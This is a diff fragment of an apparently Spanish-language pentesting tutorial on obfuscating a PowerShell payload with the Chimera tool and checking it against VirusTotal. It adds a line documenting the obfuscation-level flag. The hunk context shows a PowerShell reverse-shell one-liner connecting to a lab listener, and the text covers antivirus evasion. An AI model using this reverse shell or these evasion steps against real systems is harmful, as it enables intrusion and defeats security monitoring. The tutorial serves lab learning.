@@ -200,6 +200,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.0.2.5",4444);$stream = $cl
 
 Para ofuscarlo debemos ejectar el siguiente comando (sin -b) e ir probando el resultado en [VirusTotal](https://www.virustotal.com/gui/home/upload). En los detalles alertan las siguientes funciones: new-object y out-string.<br><br>Mirando la ayuda esto es lo que podemos hacer con Chimera:
 
+-l: Nivel 1 a 5 (no recomiendo colocarlo en 5)<br>
 -f: Archivo de entrada.<br>
 -o: Archivo de salida.<br>
 -v: Substituir nombres de variables.<br>
